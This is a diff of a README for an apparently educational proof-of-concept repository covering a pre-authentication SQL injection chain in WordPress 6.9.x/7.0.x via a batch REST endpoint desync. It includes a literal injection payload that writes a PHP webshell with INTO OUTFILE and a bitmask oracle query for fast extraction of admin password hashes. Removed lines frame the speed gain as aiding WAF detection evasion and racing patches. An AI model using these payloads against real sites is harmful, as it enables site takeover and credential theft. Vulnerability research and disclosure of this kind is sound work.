@@ -4,74 +4,11 @@ Educational PoC and lab for **CVE-2026-63030 + CVE-2026-60137** — pre-authenti
 
 Discovered by Adam Kues (Searchlight Cyber / Assetnote). Fixed in WordPress 6.9.5 / 7.0.2.
 
-| Version | Status |
-|---------|--------|
-| &lt; 6.9.0 | not affected |
-| 6.9.0 – 6.9.4 | **affected** |
-| 7.0.0 – 7.0.1 | **affected** |
-
-## The vulnerability in one diagram
-
-```
- ATTACKER (anonymous)
-    │
-    │  POST /?rest_route=/batch/v1          ← no auth required
-    │
-    ▼
- ┌──────────────────────────────────────────────────────────────────┐
- │  OUTER BATCH  (serve_batch_request_v1)                          │
- │                                                                  │
- │  sub-requests:                                                   │
- │    [0]  "http://"            ← fails wp_parse_url()              │
- │    [1]  POST /wp/v2/posts    ← body carries inner batch          │
- │    [2]  POST /batch/v1       ← supplies batch handler            │
- │                                                                  │
- │  $validation:  [ error,  OK(posts),    OK(batch)  ]              │
- │  $matches:     [         posts_handler, batch_handler ]          │
- │                 ↑                                                │
- │                 BUG: error skipped in $matches, arrays misalign  │
- │                                                                  │
- │  dispatch: request[1] (posts) gets $matches[1] (batch handler)  │
- │            → posts body executed as a nested batch               │
- └──────────────────────────────┬───────────────────────────────────┘
-                                │
-                                ▼
- ┌──────────────────────────────────────────────────────────────────┐
- │  INNER BATCH  (recursive serve_batch_request_v1)                │
- │                                                                  │
- │  sub-requests:                                                   │
- │    [0]  "http://"            ← same desync trick                 │
- │    [1]  POST /categories     ← author_exclude=<SQLI>            │
- │    [2]  GET  /wp/v2/posts    ← supplies posts handler            │
- │                                                                  │
- │  Same misalignment:                                              │
- │  request[1] (categories) gets $matches[1] (posts get_items)     │
- │                                                                  │
- │  categories schema has no author_exclude → value unsanitized    │
- │  posts get_items maps author_exclude → WP_Query::author__not_in │
- └──────────────────────────────┬───────────────────────────────────┘
-                                │
-                                ▼
- ┌──────────────────────────────────────────────────────────────────┐
- │  WP_Query (vulnerable code, pre-6.9.5)                          │
- │                                                                  │
- │  // author__not_in is a STRING, not an array                     │
- │  // is_array() check fails → absint() sanitization skipped      │
- │  // raw string interpolated directly into SQL                    │
- │                                                                  │
- │  $where .= "AND post_author NOT IN ($author__not_in)"           │
- │                                       ^^^^^^^^^^^^               │
- │                                       attacker-controlled        │
- │                                                                  │
- │  → SQL INJECTION                                                 │
- └──────────────────────────────────────────────────────────────────┘
-```
-
-## Step by step
+## The exploit
 
 ### Step 1: The batch endpoint is unauthenticated
 
-`POST /wp-json/batch/v1` lets you send multiple REST API calls in one request. It has **no auth check** — security is delegated to each sub-request's own permission callback.
+`POST /wp-json/batch/v1` bundles multiple REST API calls into one request. It has **no auth check** — security is delegated to each sub-request's own permission callback.
 
 ### Step 2: The desync
 
@@ -118,66 +55,69 @@ Boolean oracle: posts returned = true, empty = false. Binary search per characte
 author_exclude = 0) AND 1=0 UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/path/shell.php'-- -
 ```
 
-## Why fast extraction matters when RCE exists
-
-The INTO OUTFILE RCE requires **MySQL FILE privilege** — the DB user must have `GRANT FILE ON *.*`. This is **not** the WordPress default. Managed hosts (cPanel, WP Engine, Kinsta, etc.) grant per-database privileges only. FILE shows up mainly on self-managed VPS/DIY stacks.
-
-On the vast majority of real WordPress sites:
+## The batch desync
 
 ```
-                    ┌─────────────────────┐
-                    │   Can you get RCE?  │
-                    └──────────┬──────────┘
-                               │
-                    ┌──────────▼──────────┐
-                    │  DB user has FILE?  │
-                    └──────────┬──────────┘
-                          ╱          ╲
-                        yes           no (most sites)
-                        ╱               ╲
-               ┌───────▼──────┐   ┌─────▼──────────────────┐
-               │ INTO OUTFILE │   │ Extract admin hash     │
-               │ → webshell   │   │ → crack offline        │
-               │ (1 request)  │   │ → login → upload plugin│
-               └──────────────┘   └─────┬──────────────────┘
-                                        │
-                                   how many requests
-                                   to extract the hash?
-                                        │
-                                  ╱            ╲
-                             blind              fast
-                            ~224 req           ~3 req
-                            ~2 min             ~1 sec
+ ATTACKER (anonymous)
+    │
+    │  POST /?rest_route=/batch/v1          ← no auth required
+    │
+    ▼
+ ┌──────────────────────────────────────────────────────────────────┐
+ │  OUTER BATCH  (serve_batch_request_v1)                          │
+ │                                                                  │
+ │  sub-requests:                                                   │
+ │    [0]  "http://"            ← fails wp_parse_url()              │
+ │    [1]  POST /wp/v2/posts    ← body carries inner batch          │
+ │    [2]  POST /batch/v1       ← supplies batch handler            │
+ │                                                                  │
+ │  $validation:  [ error,  OK(posts),     OK(batch)     ]          │
+ │  $matches:     [         posts_handler, batch_handler  ]         │
+ │                 ↑                                                │
+ │                 BUG: error skipped in $matches, arrays misalign  │
+ │                                                                  │
+ │  dispatch: request[1] (posts) gets $matches[1] (batch handler)  │
+ │            → posts body executed as a nested batch               │
+ └──────────────────────────────┬───────────────────────────────────┘
+                                │
+                                ▼
+ ┌──────────────────────────────────────────────────────────────────┐
+ │  INNER BATCH  (recursive serve_batch_request_v1)                │
+ │                                                                  │
+ │  sub-requests:                                                   │
+ │    [0]  "http://"            ← same desync trick                 │
+ │    [1]  POST /categories     ← author_exclude=<SQLI>            │
+ │    [2]  GET  /wp/v2/posts    ← supplies posts handler            │
+ │                                                                  │
+ │  Same misalignment:                                              │
+ │  request[1] (categories) gets $matches[1] (posts get_items)     │
+ │                                                                  │
+ │  categories schema has no author_exclude → value unsanitized    │
+ │  posts get_items maps author_exclude → WP_Query::author__not_in │
+ │                                                                  │
+ │  → SQL INJECTION                                                 │
+ └──────────────────────────────────────────────────────────────────┘
 ```
 
-For the **common case** (no FILE privilege), the attack path is: extract admin password hash → crack it offline → log in → upload a plugin webshell. The hash extraction is the bottleneck. Blind extraction takes ~224 HTTP requests (~2 minutes). Fast extraction does it in ~3 requests (~1 second). That matters for:
+## Fast extraction via X-WP-Total bitmask oracle
 
-- **Detection evasion** — 3 requests vs 224 in WAF logs
-- **Race conditions** — extract before auto-update patches the site
-- **Practical speed** — on an engagement with many WordPress targets
+Existing PoCs use blind boolean extraction — 1 bit per HTTP request, ~224 requests for a password hash. This repo introduces two techniques that combine for ~75x faster extraction.
 
-## What's new in this repo
-
-### X-WP-Total bitmask oracle
-
-WordPress adds `SQL_CALC_FOUND_ROWS` to post queries and puts the count in the `X-WP-Total` response header. UNION rows are counted at the SQL level even though PHP filters them from the response body. We use conditional UNIONs to encode individual bits:
+**X-WP-Total oracle.** WordPress adds `SQL_CALC_FOUND_ROWS` to post queries and puts the count in the `X-WP-Total` response header. UNION rows are counted at the SQL level even though PHP filters them from the response body. Conditional UNIONs encode individual bits:
 
 ```sql
 0) AND 1=0
 UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 1) > 0   -- bit 0
 UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
-UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 4) > 0   -- bit 2
-...                                                            -- bits 3-6
+...                                                            -- bits 2-6
 -- -
 ```
 
-X-WP-Total = 0 (bit not set) or 1 (bit set). Seven probes = one full ASCII character.
+`X-WP-Total` = 0 (bit not set) or 1 (bit set). Seven probes = one full ASCII character.
 
-### Unlimited inner batch
+**Unlimited inner batch.** The outer batch validates `maxItems: 25` via its schema. The route confusion bypasses this — the inner batch runs through `serve_batch_request_v1()` recursively with no size check. All 7 bit-probes for multiple characters pack into one inner batch.
 
-The outer batch endpoint validates `maxItems: 25` via its schema. But the route confusion bypasses this — the inner batch runs through `serve_batch_request_v1()` recursively with **no size check**. We pack all 7 bit-probes for multiple characters into one inner batch.
-
-16 characters × 7 bits = 112 probes per HTTP request. A 34-char phpass hash in ~3 requests.
+16 characters × 7 bits = 112 probes per HTTP request. A 34-char phpass hash in ~3 requests instead of ~224.
 
 ## Quick start
 
